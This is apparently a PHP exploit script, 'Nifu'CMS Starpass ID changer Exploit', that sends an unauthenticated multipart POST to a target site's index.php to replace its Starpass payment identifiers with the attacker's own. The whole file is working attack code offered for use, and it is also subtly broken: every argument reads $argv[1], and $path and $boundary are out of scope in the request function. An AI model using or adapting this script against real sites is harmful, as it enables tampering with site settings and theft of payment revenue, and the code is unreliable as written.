<?php
/*
!Nifu_Starpass
@HOST = 127.0.0.1 = Target HOST
@PORT = 80 = Target PORT
@IDD = = Your Starpass IDD
@IDP = = Your Starpass IDP
*/
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
 
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
function postit($host, $port, $payload)
{
$packet  = "POST {$path}index.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary={$boundary}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";
print"\n[+] Request sent";
http_send($host,$packet);
}

print "\n+---------------------------------------------------------------+";
print "\n| Nifu'CMS Starpass ID changer Exploit                          |";
print "\n|                                        by The UnKn0wN         |";
print "\n+---------------------------------------------------------------+\n";

$HOST = $argv[1];
$PORT = $argv[1];
$IDD = $argv[1];
$IDP = $argv[1];

$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"idd\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"valeur\"\r\n\r\n{$IDD}\r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"idp\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"valeur\"\r\n\r\n{$IDP}\r\n";
$payload .= "--{$boundary}--\r\n";

postit($HOST,$PORT,$payload);
